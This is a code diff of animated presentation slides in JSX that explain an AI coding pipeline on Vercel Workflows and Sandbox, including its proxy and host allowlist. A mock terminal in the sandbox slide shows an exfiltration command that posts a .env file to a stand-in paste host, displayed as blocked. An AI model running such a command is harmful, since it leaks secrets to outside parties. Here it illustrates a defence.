@@ -1,5 +1,5 @@
 import { motion } from 'motion/react';
-import { at, Replay, Code, Label, Model, Kicker, Tick, Token, Vercel, IssueIcon, PrIcon, later, box } from './kit.jsx';
+import { at, Replay, useEntries, Code, Label, Model, Kicker, Tick, Token, Vercel, IssueIcon, PrIcon, later, box } from './kit.jsx';
 
 /* ------------------------------------------------------------------ *
  * The platform — what the factory is made of. The map and the seven
@@ -116,7 +116,7 @@ function Map() {
         </div>
         <div className="pz-appear mt-3.5 flex items-center gap-2 text-[17px] text-muted" style={later(2900)}>
           <span className="rounded-full border border-amber-400/50 bg-amber-500/15 px-2.5 py-0.5 font-mono text-[13px] text-amber-200">Jev</span>
-          picks one for each job
+          picks one for each step
         </div>
       </Product>
 
@@ -128,45 +128,69 @@ function Map() {
 
 /* --------------------------- the webhook -------------------------- */
 
-const ROUTES = [
-  { icon: '🏷️', event: <>an issue gets <Label name="ready-for-ai" className="mx-1 text-[14px]" /> or <Code>/ship</Code></>, to: ['ship'] },
-  { icon: '🔀', event: <>a pull request opens, or <Code>/review</Code></>, to: ['verify', 'review', 'qa', 'screenshots'] },
-  { icon: '✍️', event: <><Code>/fix make the heading smaller</Code> on a pull request</>, to: ['respond'] },
-  { icon: '🟣', event: 'a pull request is merged', to: [], wake: 'wakes the sleeping ship run' },
-  { icon: '⬆️', event: <>a push to <Code>main</Code></>, to: ['verify', 'warm'] },
+/* Triage in one picture: the label reaches the factory's one door, ship starts,
+ * and Jev makes the run's two decisions before any machine exists. */
+function Hop({ delay }) {
+  return (
+    <svg viewBox="0 0 90 20" className="h-5 w-[90px] shrink-0" aria-hidden="true">
+      <path d="M4 10 L80 10" pathLength="1" className="pz-draw-in" fill="none" stroke="#6d28d9" strokeWidth="2.5" style={later(delay)} />
+      <g className="pz-appear" style={later(delay + 600)}>
+        <path d="M4 10 L80 10" pathLength="1" className="pz-flow" fill="none" stroke="#c4b5fd" strokeWidth="2.5" />
+        <path d="M76 5 L84 10 L76 15" fill="none" stroke="#c4b5fd" strokeWidth="2.5" />
+      </g>
+    </svg>
+  );
+}
+
+const JEV = 'rounded-full border border-amber-400/60 bg-amber-500/20 px-3 py-0.5 font-mono text-[17px] text-amber-100';
+
+const DECISIONS = [
+  { who: null, icon: '🏷️', title: 'Claims the ticket', sub: 'a second label starts nothing', ms: null },
+  { who: 'Jev', title: 'How big is this ticket?', sub: 'fast · small · full', ms: '300 ms' },
+  { who: 'Jev', title: 'Which model for each step?', sub: 'the cheapest that can do it', ms: '300 ms' },
 ];
 
 export function Switchboard() {
   return (
-    <div className="flex h-full flex-col justify-between">
-      <div className="pz-appear flex items-center gap-4 rounded-2xl border border-violet-400/50 bg-raised px-6 py-2">
-        <Vercel className="size-5 text-ink" />
-        <Code className="whitespace-nowrap text-[19px]">POST /api/github</Code>
-        <div className="ml-auto flex gap-x-6 text-[16px] text-muted">
-          <span><Tick className="mr-1.5 size-5 text-[11px]" />HMAC-signed</span>
-          <span><Tick className="mr-1.5 size-5 text-[11px]" />one repository</span>
-          <span><Tick className="mr-1.5 size-5 text-[11px]" />writers only</span>
+    <div className="flex h-full flex-col gap-4">
+      <div className="flex h-[176px] items-stretch">
+        <div className={`${box} pz-appear flex flex-1 flex-col justify-center px-6`}>
+          <Kicker>GitHub</Kicker>
+          <div className="mt-2 flex items-center gap-2.5 text-[22px] text-ink"><IssueIcon className="size-5 text-emerald-400" /> Issue #140 gets</div>
+          <div className="mt-2"><Label name="ready-for-ai" className="pz-pop text-[15px]" style={later(400)} /></div>
+        </div>
+        <div className="flex items-center"><Hop delay={700} /></div>
+        <div className="pz-glow pz-appear flex flex-1 flex-col justify-center rounded-2xl border border-violet-400/60 bg-raised px-6" style={later(900)}>
+          <div className="flex items-center gap-2.5"><Vercel className="size-4 text-ink" /><Kicker>The factory’s one door</Kicker></div>
+          <div className="mt-2"><Code className="whitespace-nowrap text-[22px]">POST /api/github</Code></div>
+          <div className="mt-3 flex gap-x-4 text-[16px] text-muted">
+            {['signed', 'one repository', 'writers only'].map((c) => <span key={c} className="flex items-center gap-1.5 whitespace-nowrap"><Tick className="size-5 text-[11px]" />{c}</span>)}
+          </div>
+        </div>
+        <div className="flex items-center"><Hop delay={1500} /></div>
+        <div className={`${box} pz-appear flex flex-1 flex-col justify-center px-6`} style={later(1900)}>
+          <Kicker>A Vercel Workflow starts</Kicker>
+          <div className="mt-2 flex items-center gap-3"><span className="text-[36px] leading-none">🏭</span><span className="font-mono text-[32px] text-ink">ship</span></div>
         </div>
       </div>
-      {ROUTES.map((r, i) => (
-        <div key={i} className="pz-appear grid grid-cols-[1fr_110px_1fr] items-center" style={later(350 + i * 260)}>
-          <div className="flex h-[58px] min-w-0 items-center gap-3 rounded-xl border border-hairline bg-surface px-5 text-[20px] text-ink">
-            <span className="w-8 text-center text-[23px]">{r.icon}</span>
-            <span className="min-w-0 truncate">{r.event}</span>
+
+      <div className="pz-appear flex items-center gap-3" style={later(2500)}>
+        <Kicker>Then, before any machine starts</Kicker>
+        <span className="h-px flex-1 bg-hairline" />
+        <span className="font-display text-[26px] text-ink">about a second</span>
+      </div>
+      <div className="grid flex-1 grid-cols-3 gap-4">
+        {DECISIONS.map((d, i) => (
+          <div key={d.title} className={`pz-appear flex flex-col justify-center rounded-2xl border px-6 ${d.who ? 'border-amber-400/50 bg-raised' : 'border-hairline bg-surface'}`} style={later(2800 + i * 350)}>
+            <div className="flex items-center gap-3">
+              {d.who ? <span className={JEV}>{d.who}</span> : <span className="text-[26px]">{d.icon}</span>}
+              {d.ms && <span className="ml-auto font-mono text-[18px] text-amber-300">{d.ms}</span>}
+            </div>
+            <div className="mt-3 font-display text-[25px] leading-tight text-ink">{d.title}</div>
+            <div className="mt-1 text-[18px] text-muted">{d.sub}</div>
           </div>
-          <svg viewBox="0 0 110 20" className="h-5 w-full" aria-hidden="true">
-            <path d="M4 10 L100 10" pathLength="1" className="pz-draw-in" fill="none" stroke="#6d28d9" strokeWidth="2.5" style={later(500 + i * 260)} />
-            <g className="pz-appear" style={later(1100 + i * 260)}>
-              <path d="M4 10 L100 10" pathLength="1" className="pz-flow" fill="none" stroke="#c4b5fd" strokeWidth="2.5" />
-              <path d="M96 5 L104 10 L96 15" fill="none" stroke="#c4b5fd" strokeWidth="2.5" />
-            </g>
-          </svg>
-          <div className="flex h-[58px] min-w-0 items-center gap-2 rounded-xl border border-hairline bg-surface px-5">
-            {r.to.map((w) => <Wf key={w} name={w} />)}
-            {r.wake && <span className="font-mono text-[16px] text-violet-200">💤 → ⚡ {r.wake}</span>}
-          </div>
-        </div>
-      ))}
+        ))}
+      </div>
     </div>
   );
 }
@@ -183,18 +207,23 @@ const SEVEN = [
   { name: 'warm', mode: null, when: 'push to main · daily', does: 'rebuilds the sandbox every run forks' },
 ];
 
-const MODE_TONE = { push: 'border-fuchsia-400/40 text-fuchsia-200', read: 'border-sky-400/40 text-sky-200', none: 'border-hairline text-muted' };
 
 function Seven() {
   return (
-    <div className="grid h-full grid-cols-4 grid-rows-2 gap-4">
+    <div className="pz-glow flex h-full flex-col overflow-hidden rounded-3xl border border-violet-400/60 bg-raised">
+      {/* the same header as the factory's box on the map, so the zoom lands on itself */}
+      <div className="flex items-center gap-3 border-b border-hairline px-6 py-3">
+        <Vercel className="size-5 text-ink" /><span className="font-display text-[26px] text-ink">The factory</span>
+        <span className="ml-auto text-[17px] text-faint">seven Vercel Workflows</span>
+      </div>
+      <div className="grid min-h-0 flex-1 grid-cols-4 grid-rows-2 gap-3.5 p-4">
       {SEVEN.map((w, i) => (
         <motion.div
           key={w.name}
-          className={`${box} flex flex-col justify-center p-6`}
+          className={`${box} flex flex-col justify-center px-5 py-3 ${w.name === 'ship' ? 'border-violet-400/50' : ''}`}
           initial={{ opacity: 0, y: 40, rotateX: -20 }}
           animate={{ opacity: 1, y: 0, rotateX: 0 }}
-          transition={{ delay: 0.15 + i * 0.09, type: 'spring', stiffness: 130, damping: 17 }}
+          transition={{ delay: 0.75 + i * 0.07, type: 'spring', stiffness: 130, damping: 17 }}
         >
           <div className="flex items-center gap-3">
             <span className="text-[38px] leading-none">{WORKFLOWS[w.name]}</span>
@@ -204,22 +233,50 @@ function Seven() {
           <div className="mt-2 text-[21px] leading-snug text-muted">{w.does}</div>
         </motion.div>
       ))}
+      {/* not a workflow: a note on what one is, so it is drawn as a note */}
       <motion.div
-        className="flex flex-col justify-center rounded-2xl border border-violet-400/50 bg-raised p-6"
-        initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }} transition={{ delay: 1.1, type: 'spring', stiffness: 140, damping: 16 }}
+        className="flex flex-col justify-center rounded-2xl border border-dashed border-hairline px-5 py-3"
+        initial={{ opacity: 0 }} animate={{ opacity: 1 }} transition={{ delay: 1.5, duration: 0.6 }}
       >
-        <div className="font-display text-[32px] leading-tight text-ink">Scripts, not prompts</div>
-        <div className="mt-3 text-[21px] leading-snug text-muted">The flow is TypeScript. Agents only do the work.</div>
+        <div className="flex items-center gap-2 whitespace-nowrap text-[13px] uppercase tracking-[0.12em] text-faint"><Vercel className="size-3" /> What makes it a Vercel Workflow</div>
+        <div className="mt-3 text-[19px] leading-snug text-muted">TypeScript, with <span className="text-ink">every step saved</span> — so a run is</div>
+        <div className="mt-2.5 flex flex-wrap gap-1.5">
+          {['persisted', 'observable', 'resumable'].map((t) => <span key={t} className="rounded-full border border-violet-400/40 bg-violet-500/10 px-2.5 py-0.5 font-mono text-[14px] text-violet-200">{t}</span>)}
+        </div>
       </motion.div>
+      </div>
     </div>
   );
 }
 
+// the factory's box on the map, and how far the camera pushes in to fill the panel with it
+const FACTORY = { cx: 700, cy: 205 };
+const ZOOM = 1440 / 500;
+
 function MapScene({ step }) {
+  const mapEntries = useEntries(step === 0);
+  const sevenEntries = useEntries(step === 1);
   return (
     <>
-      <Replay on={step === 0} from="scale" style={at(0, 0, 1600, 900)}><Map /></Replay>
-      <Replay on={step === 1} from="up" style={at(80, 70, 1440, 530)}><Seven /></Replay>
+      {/* the camera pushes into the factory's box, and the box opens into its seven workflows */}
+      <motion.div
+        style={{ ...at(0, 0, 1600, 900), transformOrigin: `${FACTORY.cx}px ${FACTORY.cy}px`, pointerEvents: step === 0 ? undefined : 'none' }}
+        aria-hidden={step === 0 ? undefined : true}
+        initial={false}
+        animate={step === 0 ? { scale: 1, x: 0, y: 0, opacity: 1 } : { scale: ZOOM, x: 800 - FACTORY.cx, y: 335 - FACTORY.cy, opacity: 0 }}
+        transition={{ duration: 0.9, ease: [0.65, 0, 0.35, 1], opacity: { duration: step === 0 ? 0.5 : 0.7, delay: step === 0 ? 0.3 : 0.15 } }}
+      >
+        <div key={mapEntries} className="contents"><Map /></div>
+      </motion.div>
+      <motion.div
+        style={{ ...at(80, 70, 1440, 530), transformOrigin: `${FACTORY.cx - 80}px ${FACTORY.cy - 70}px`, pointerEvents: step === 1 ? undefined : 'none' }}
+        aria-hidden={step === 1 ? undefined : true}
+        initial={false}
+        animate={step === 1 ? { scale: 1, opacity: 1 } : { scale: step === 0 ? 1 / ZOOM : 1, opacity: 0 }}
+        transition={{ duration: 0.9, ease: [0.65, 0, 0.35, 1], opacity: { duration: 0.5, delay: step === 1 ? 0.35 : 0 } }}
+      >
+        <div key={sevenEntries} className="contents"><Seven /></div>
+      </motion.div>
     </>
   );
 }
@@ -261,7 +318,7 @@ function Trace() {
                   <>
                     <span className="pz-fill absolute inset-y-0 rounded-l bg-emerald-400/60 ring-1 ring-emerald-300/70" style={{ left: `${start}%`, width: `${CRASH - start}%`, animationDuration: `${(CRASH - start) * MS}ms`, animationDelay: `${T0 + start * MS}ms`, animationTimingFunction: 'linear' }} />
                     <span className="pz-fill absolute inset-y-0 rounded-r bg-emerald-400/60 ring-1 ring-emerald-300/70" style={{ left: `${CRASH + 1.2}%`, width: `${start + width - CRASH - 1.2}%`, animationDuration: `${(start + width - CRASH) * MS}ms`, animationDelay: `${CRASH_AT + 1500}ms`, animationTimingFunction: 'linear' }} />
-                    <span className="pz-appear absolute -top-[19px] whitespace-nowrap font-mono text-[12px] text-amber-300" style={{ left: `${CRASH + 2}%`, ...later(CRASH_AT + 1500) }}>the same job: it never stopped running in the sandbox</span>
+                    <span className="pz-appear absolute -top-[19px] whitespace-nowrap font-mono text-[12px] text-amber-300" style={{ left: `${CRASH + 2}%`, ...later(CRASH_AT + 1500) }}>the same step: it never stopped running in the sandbox</span>
                   </>
                 ) : (
                   <span className="pz-fill absolute inset-y-0 rounded bg-emerald-400/60 ring-1 ring-emerald-300/70" style={{ left: `${start}%`, width: `${width}%`, animationDuration: `${width * MS}ms`, animationDelay: `${(start > CRASH ? 1500 : 0) + T0 + start * MS}ms`, animationTimingFunction: 'linear' }} />
@@ -282,7 +339,7 @@ function Trace() {
 
 const DURABLE = [
   ['📼', 'Every step is recorded', 'A finished step never runs twice: replay reads the event log.'],
-  ['🧵', 'No function waits on an agent', 'Jobs run detached in the sandbox; the workflow checks in.'],
+  ['🧵', 'No function waits on an agent', 'The agent runs detached in the sandbox; the step checks in.'],
   ['🛟', 'A lost machine comes back', 'A timed-out sandbox resumes from its snapshot.'],
 ];
 
@@ -302,50 +359,59 @@ export function Durable() {
   );
 }
 
+/* One picture: what the run costs over time. Busy while it works, a flat zero
+ * while it waits for a person, a short burst when the merge wakes it. */
+const WORK = 'M40 250 C 70 250, 80 130, 112 130 S 150 190, 182 160 S 232 70, 272 100 S 332 180, 362 140 S 410 250, 432 250';
+const WAKE = 'M1080 250 C 1100 250, 1112 165, 1142 165 S 1196 250, 1232 250';
+const MOMENTS = [
+  { x: 40, icon: '🏷️', t: 'labelled', d: 300 },
+  { x: 432, icon: '🔀', t: 'pull request opens', d: 1500 },
+  { x: 1080, icon: '👤', t: 'you click merge', d: 3000 },
+  { x: 1232, icon: '🚀', t: 'live in production', d: 3900 },
+];
+
 export function Asleep() {
-  const WAKE = 3000;
   return (
     <div className="flex h-full flex-col gap-4">
-      <div className="grid grid-cols-[1fr_520px] gap-6">
-        <div className="overflow-hidden rounded-2xl border border-hairline bg-[#0d0f15]">
-          <div className="border-b border-hairline bg-surface px-5 py-2 font-mono text-[13px] text-faint">factory/workflows/ship.ts — abridged</div>
-          <div className="px-6 py-2.5 font-mono text-[16.5px] leading-[1.55]">
-            <div className="pz-appear text-faint" style={later(200)}>{'// the moment the pull request exists'}</div>
-            <div className="pz-appear" style={later(400)}><span className="text-violet-300">const</span> <span className="text-ink">merged</span> = <span className="text-cyan-300">createHook</span>({'{'} token: <span className="text-emerald-300">'pr:…#142'</span> {'}'});</div>
-            <div className="pz-appear text-faint" style={later(900)}>{'// …preview, review, QA, any fixes…'}</div>
-            <div className="pz-appear" style={later(1300)}><span className="text-violet-300">const</span> <span className="text-ink">closed</span> = <span className="text-violet-300">await</span> <span className="text-ink">merged</span>; <span className="text-faint">{'// asleep until GitHub says so'}</span></div>
-            <div className="pz-appear" style={later(WAKE + 600)}><span className="text-violet-300">await</span> <span className="text-cyan-300">productionHealth</span>(<span className="text-emerald-300">'/api/health'</span>);</div>
-          </div>
-        </div>
-        <div className={`${box} pz-appear flex flex-col justify-center px-6 py-3`} style={later(1700)}>
-          <div className="font-display text-[56px] leading-none text-ink">$0<span className="text-[26px] text-muted"> while it waits</span></div>
-          <div className="mt-2 text-[19px] leading-snug text-muted">No function, no sandbox.</div>
-        </div>
-      </div>
-
-      {/* the timeline: awake, asleep, awake */}
-      <div className="relative flex-1">
-        <div className="absolute inset-x-0 top-[92px] h-0.5 bg-hairline" />
-        <span className="pz-fill absolute left-0 top-[92px] h-0.5 w-[24%] origin-left bg-gradient-to-r from-violet-500 to-cyan-300" style={{ animationDuration: '900ms', animationDelay: '300ms' }} />
-        <svg viewBox="0 0 1440 120" className="absolute inset-x-0 top-[34px] h-[120px] w-full" aria-hidden="true">
- <path d="M346 59 L922 59" pathLength="1" className="pz-draw-in" fill="none" stroke="#6d5fa0" strokeWidth="2" strokeDasharray="0.012 0.012" style={later(1300)} />
+      <div className={`${box} relative flex-1 overflow-hidden`}>
+        <svg viewBox="0 0 1440 372" className="absolute inset-0 size-full" aria-hidden="true">
+          <defs>
+            <linearGradient id="pz-work" x1="0" y1="0" x2="0" y2="1"><stop offset="0%" stopColor="#8b5cf6" stopOpacity="0.55" /><stop offset="100%" stopColor="#8b5cf6" stopOpacity="0" /></linearGradient>
+            <linearGradient id="pz-wake" x1="0" y1="0" x2="0" y2="1"><stop offset="0%" stopColor="#34d399" stopOpacity="0.55" /><stop offset="100%" stopColor="#34d399" stopOpacity="0" /></linearGradient>
+          </defs>
+          <line x1="40" y1="250" x2="1400" y2="250" stroke="#333950" strokeWidth="2" />
+          {/* the work */}
+          <path d={`${WORK} Z`} fill="url(#pz-work)" className="pz-appear" style={later(1100)} />
+          <path d={WORK} pathLength="1" className="pz-draw-in" fill="none" stroke="#a78bfa" strokeWidth="3.5" style={{ animationDuration: '1200ms', ...later(300) }} />
+          {/* the wait: nothing */}
+          <path d="M432 250 L1080 250" pathLength="1" className="pz-draw-in" fill="none" stroke="#6d5fa0" strokeWidth="3.5" strokeDasharray="0.012 0.012" style={{ animationDuration: '1400ms', ...later(1600) }} />
+          {/* the wake */}
+          <path d={`${WAKE} Z`} fill="url(#pz-wake)" className="pz-appear" style={later(3500)} />
+          <path d={WAKE} pathLength="1" className="pz-draw-in" fill="none" stroke="#34d399" strokeWidth="3.5" style={{ animationDuration: '600ms', ...later(3000) }} />
+          <path d="M1232 250 L1400 250" fill="none" stroke="#333950" strokeWidth="3.5" />
+          {MOMENTS.map((m) => <circle key={m.t} cx={m.x} cy="250" r="7" fill="#12141c" stroke="#c4b5fd" strokeWidth="3" className="pz-appear" style={later(m.d)} />)}
         </svg>
-        <span className="pz-fill absolute left-[64%] top-[92px] h-0.5 w-[36%] origin-left bg-gradient-to-r from-violet-500 to-emerald-300" style={{ animationDuration: '900ms', animationDelay: `${WAKE + 300}ms` }} />
-        {[
-          { x: '0%', icon: '🏷️', t: 'labelled', s: 'the run starts', d: 200 },
-          { x: '24%', icon: '🔀', t: 'pull request opens', s: 'the hook is created', d: 1000 },
-          { x: '64%', icon: '🟣', t: 'you click merge', s: 'the webhook resumes the hook', d: WAKE },
-          { x: '85%', icon: '🚀', t: 'production is healthy', s: 'the issue is closed', d: WAKE + 1100 },
-        ].map((n) => (
-          <div key={n.t} className="pz-appear absolute top-[70px] w-[260px]" style={{ left: n.x, ...later(n.d) }}>
-            <span className="grid size-11 place-items-center rounded-full border border-hairline bg-raised text-[20px]">{n.icon}</span>
-            <div className="mt-3 text-[21px] font-semibold text-ink">{n.t}</div>
-            <div className="text-[16px] text-faint">{n.s}</div>
+
+        <div className="absolute left-[24px] top-[14px] font-mono text-[12px] uppercase tracking-[0.18em] text-faint">what the run is using</div>
+        <div className="pz-appear absolute left-[9%] top-[26px] w-[220px] text-center font-display text-[24px] text-violet-200" style={later(900)}>the run works</div>
+        <div className="pz-appear absolute left-[30%] top-[52px] flex w-[45%] flex-col items-center" style={later(2000)}>
+          <div className="flex items-center gap-4"><span className="pz-float text-[40px]">💤</span><span className="font-display text-[92px] leading-none text-ink">$0</span></div>
+          <div className="mt-1 text-[21px] text-muted">asleep, waiting for you: an hour, or the whole weekend</div>
+          <div className="text-[16px] text-faint">no function running, no sandbox running</div>
+        </div>
+        <div className="pz-appear absolute right-[10%] top-[96px] w-[200px] text-center font-display text-[24px] text-emerald-200" style={later(3300)}>⚡ it wakes</div>
+
+        {MOMENTS.map((m, i) => (
+          <div key={m.t} className={`pz-appear absolute top-[272px] flex flex-col whitespace-nowrap ${i === 0 ? 'items-start' : '-translate-x-1/2 items-center'}`} style={{ left: `${(m.x / 1440) * 100}%`, ...later(m.d) }}>
+            <span className="text-[22px]">{m.icon}</span>
+            <span className="text-[17px] font-semibold text-ink">{m.t}</span>
           </div>
         ))}
-        <div className="pz-appear absolute left-[36%] top-[34px] flex items-center gap-3 font-mono text-[18px] text-violet-200" style={later(1700)}>
-          <span className="pz-float text-[30px]">💤</span> asleep: minutes, or days
-        </div>
+      </div>
+      <div className="pz-appear flex items-center gap-4 rounded-2xl border border-hairline bg-surface px-6 py-3 text-[18px] text-muted" style={later(4300)}>
+        <Vercel className="size-4 shrink-0 text-ink" />
+        <span>How: a <b className="text-ink">Vercel Workflow hook</b>. The run awaits it; GitHub’s merge webhook resumes it.</span>
+        <Code className="ml-auto whitespace-nowrap text-[16px]">await merged</Code>
       </div>
     </div>
   );
@@ -354,123 +420,73 @@ export function Asleep() {
 
 /* --------------------------- Vercel Sandbox ----------------------- */
 
-const RUNS = [
-  { name: 'ship-140', mode: 'push', does: 'builds the change', x: 600, y: 0 },
-  { name: 'review-142', mode: 'read', does: 'reads the diff', x: 1030, y: 0, later: true },
-  { name: 'qa-142', mode: 'read', does: 'drives a browser', x: 600, y: 190, later: true },
-  { name: 'verify-142', mode: 'none', does: 'runs the tests', x: 1030, y: 190, later: true },
-];
-
-export function Fork() {
-  return (
-    <div className="relative h-full">
-      <svg viewBox="0 0 1440 460" className="pointer-events-none absolute inset-0 size-full" aria-hidden="true">
-        {RUNS.map((r, i) => {
-          const up = r.y < 100;
-          // the right-hand machines are reached through the gap between the rows
-          const d = r.x < 900
-            ? `M420 180 C 510 180, 510 ${r.y + 85}, ${r.x} ${r.y + 85}`
-            : `M420 180 C 480 180, 520 180, 580 180 L 992 180 C 1016 180, 1010 ${up ? 150 : 210}, 1030 ${up ? 144 : 216}`;
-          return (
-            <g key={r.name}>
-              <path d={d} pathLength="1" className="pz-draw-in" fill="none" stroke="#6d28d9" strokeWidth="2.5" style={later(900 + i * 220)} />
-              <g className="pz-appear" style={later(1800 + i * 220)}><path d={d} pathLength="1" className="pz-flow" fill="none" stroke="#c4b5fd" strokeWidth="2.5" /></g>
-            </g>
-          );
-        })}
-      </svg>
-
-      <div className="pz-appear absolute left-0 top-0 flex h-[360px] w-[420px] flex-col rounded-2xl border border-amber-400/50 bg-raised px-6 py-5">
-        <div className="flex items-center gap-3"><span className="text-[32px]">🔥</span><span className="font-mono text-[27px] text-ink">orbit-warm</span></div>
-        <div className="mt-0.5 text-[16px] text-amber-200/80">rebuilt on every push to main</div>
-        <div className="mt-5 space-y-4 text-[20px] text-muted">
-          {['the repository, cloned', 'npm ci, already done', 'Chromium, for Playwright', 'network locked, then snapshotted'].map((l, i) => (
-            <div key={l} className="pz-appear flex items-center gap-3" style={later(250 + i * 160)}><Tick className="size-6 text-[12px]" />{l}</div>
-          ))}
-        </div>
-      </div>
-
-      {RUNS.map((r, i) => (
-        <motion.div
-          key={r.name}
-          className={`absolute flex flex-col rounded-2xl border px-5 py-4 ${r.later ? 'border-dashed border-hairline bg-surface/50' : 'pz-glow border-violet-400/60 bg-raised'}`}
-          style={{ left: r.x, top: r.y, width: 410, height: 170 }}
-          initial={{ opacity: 0, scale: 0.7 }} animate={{ opacity: r.later ? 0.6 : 1, scale: 1 }}
-          transition={{ type: 'spring', stiffness: 200, damping: 16, delay: 1.5 + i * 0.22 }}
-        >
-          <div className="flex items-center gap-3">
-            <span className="font-mono text-[22px] text-ink">{r.name}</span>
-            <span className={`ml-auto rounded-full border px-2.5 font-mono text-[13px] ${MODE_TONE[r.mode]}`}>{r.mode}</span>
-          </div>
-          <div className="mt-0.5 text-[16px] text-muted">{r.does}</div>
-          <div className="mt-auto flex items-center gap-2 font-mono text-[13px] text-faint">
-            <span className="rounded bg-ground/70 px-2 py-1 text-emerald-300">{r.later ? 'later, for the pull request' : 'forked in seconds'}</span>
-          </div>
-        </motion.div>
-      ))}
-
-      <div className="pz-appear absolute inset-x-0 bottom-0 flex h-[64px] items-center gap-5 rounded-2xl border border-hairline bg-surface px-6 text-[20px] text-muted">
-        {['fork', 'run its jobs', 'deleted when the run ends'].map((l, i) => (
-          <span key={l} className="pz-appear flex items-center gap-5" style={later(2700 + i * 260)}>
-            {i > 0 && <span className="text-violet-300">→</span>}<b className="font-semibold text-ink">{l}</b>
-          </span>
-        ))}
-      </div>
-    </div>
-  );
-}
+/* One picture: the run forks a ready machine, and that machine holds no keys —
+ * the sandbox's proxy adds them on the way out, for a few hosts only. */
+const WARM = ['the repository, cloned', 'npm ci, already done', 'Chromium, for Playwright', 'network locked'];
 
 const HOSTS = [
-  { ok: true, host: 'github.com · api.github.com', note: 'token added here', key: true },
-  { ok: true, host: 'ai-gateway.vercel.sh', note: 'key added here', key: true },
-  { ok: true, host: 'registry.npmjs.org', note: '' },
-  { ok: true, host: 'this pull request’s preview', note: '' },
-  { ok: false, host: 'anywhere else on the internet', note: 'blocked' },
+  { ok: true, host: 'github.com', note: 'token added', key: true },
+  { ok: true, host: 'ai-gateway.vercel.sh', note: 'key added', key: true },
+  { ok: true, host: 'registry.npmjs.org' },
+  { ok: true, host: 'this pull request’s preview' },
+  { ok: false, host: 'anywhere else', note: 'blocked' },
   { ok: false, host: 'the upstream repository', note: 'blocked' },
 ];
 
-export function Network() {
+export function Sandbox() {
   const rowY = (i) => 28 + i * 58;
   return (
     <div className="relative h-full">
-      {/* the sandbox, and what is (not) inside it */}
-      <div className="pz-appear absolute left-0 top-0 flex h-[348px] w-[500px] flex-col overflow-hidden rounded-2xl border border-hairline bg-[#0d0f15]">
+      {/* the ready machine every run forks */}
+      <div className="pz-appear absolute left-0 top-0 flex h-[348px] w-[290px] flex-col rounded-2xl border border-amber-400/50 bg-raised px-5 py-4">
+        <div className="flex items-center gap-2.5"><span className="text-[26px]">🔥</span><span className="font-mono text-[23px] text-ink">orbit-warm</span></div>
+        <div className="text-[14px] text-amber-200/80">rebuilt on every push to main</div>
+        <div className="mt-4 space-y-3.5 text-[16px] text-muted">
+          {WARM.map((l, i) => <div key={l} className="pz-appear flex items-center gap-2.5" style={later(250 + i * 150)}><Tick className="size-5 text-[11px]" />{l}</div>)}
+        </div>
+      </div>
+      <div className="pz-appear absolute left-[290px] top-[150px] w-[60px] text-center" style={later(1000)}>
+        <div className="font-mono text-[12px] leading-tight text-emerald-300">fork<br />seconds</div>
+        <div className="text-[22px] leading-none text-violet-300">→</div>
+      </div>
+
+      {/* this run's machine, and what is (not) inside it */}
+      <div className="pz-appear absolute left-[350px] top-0 flex h-[348px] w-[460px] flex-col overflow-hidden rounded-2xl border border-violet-400/60 bg-[#0d0f15]" style={later(1200)}>
         <div className="flex items-center gap-2.5 border-b border-hairline bg-surface px-5 py-2.5">
           <Vercel className="size-3.5 text-ink" /><span className="font-mono text-[15px] text-ink">ship-140</span>
+          <span className="ml-auto font-mono text-[12px] text-faint">a Vercel Sandbox, for this run only</span>
         </div>
-        <div className="space-y-1 px-5 py-3 font-mono text-[14.5px]">
+        <div className="space-y-1 px-5 py-3 font-mono text-[13.5px]">
           <div className="text-faint">$ env | grep TOKEN</div>
-          <div className="pz-appear text-muted" style={later(500)}>GH_TOKEN=<span className="text-amber-300">injected-by-the-sandbox-proxy</span></div>
-          <div className="pz-appear text-muted" style={later(750)}>ANTHROPIC_AUTH_TOKEN=<span className="text-amber-300">injected-by-the-sandbox-proxy</span></div>
-          <div className="pz-appear pt-1.5 text-faint" style={later(2300)}>$ git push origin issue-140-…</div>
-          <div className="pz-appear text-emerald-300" style={later(2700)}>✓ pushed — the proxy added the token</div>
-          <div className="pz-appear pt-1.5 text-faint" style={later(3100)}>$ curl https://paste.example -d @.env</div>
-          <div className="pz-appear text-rose-300" style={later(3500)}>✕ could not resolve host</div>
+          <div className="pz-appear text-muted" style={later(1700)}>GH_TOKEN=<span className="text-amber-300">injected-by-the-sandbox-proxy</span></div>
+          <div className="pz-appear whitespace-nowrap text-muted" style={later(1900)}>ANTHROPIC_AUTH_TOKEN=<span className="text-amber-300">injected-by-the-sandbox-proxy</span></div>
+          <div className="pz-appear pt-1.5 text-faint" style={later(3300)}>$ git push origin issue-140-…</div>
+          <div className="pz-appear text-emerald-300" style={later(3700)}>✓ pushed — the proxy added the token</div>
+          <div className="pz-appear pt-1.5 text-faint" style={later(4100)}>$ curl https://paste.example -d @.env</div>
+          <div className="pz-appear text-rose-300" style={later(4500)}>✕ could not resolve host</div>
         </div>
-        <div className="pz-appear mx-5 mt-auto mb-4 rounded-xl border border-emerald-400/40 bg-emerald-500/10 px-4 py-2" style={later(1200)}>
-          <div className="font-display text-[21px] leading-tight text-emerald-100">Nothing in here is worth stealing</div>
+        <div className="pz-appear mx-5 mt-auto mb-4 rounded-xl border border-emerald-400/40 bg-emerald-500/10 px-4 py-2" style={later(2300)}>
+          <div className="font-display text-[20px] leading-tight text-emerald-100">Nothing in here is worth stealing</div>
         </div>
       </div>
 
       {/* the proxy */}
-      <div className="pz-appear absolute left-[590px] top-0 flex h-[348px] w-[64px] flex-col items-center justify-center rounded-2xl border border-violet-400/60 bg-raised" style={later(900)}>
-        <span className="text-[26px]">🔑</span>
-        <span className="mt-3 font-mono text-[14px] uppercase tracking-[0.2em] text-violet-200 [writing-mode:vertical-rl]">sandbox proxy</span>
+      <div className="pz-appear absolute left-[870px] top-0 flex h-[348px] w-[56px] flex-col items-center justify-center rounded-2xl border border-violet-400/60 bg-raised" style={later(2000)}>
+        <span className="text-[24px]">🔑</span>
+        <span className="mt-3 font-mono text-[13px] uppercase tracking-[0.2em] text-violet-200 [writing-mode:vertical-rl]">sandbox proxy</span>
       </div>
 
       <svg viewBox="0 0 1440 460" className="pointer-events-none absolute inset-0 size-full" aria-hidden="true">
         {HOSTS.map((h, i) => {
           const y = rowY(i);
-          const a = `M500 ${y} L590 ${y}`;
-          const b = `M654 ${y} L770 ${y}`;
           const colour = h.ok ? '#c4b5fd' : '#fb7185';
           return (
             <g key={h.host}>
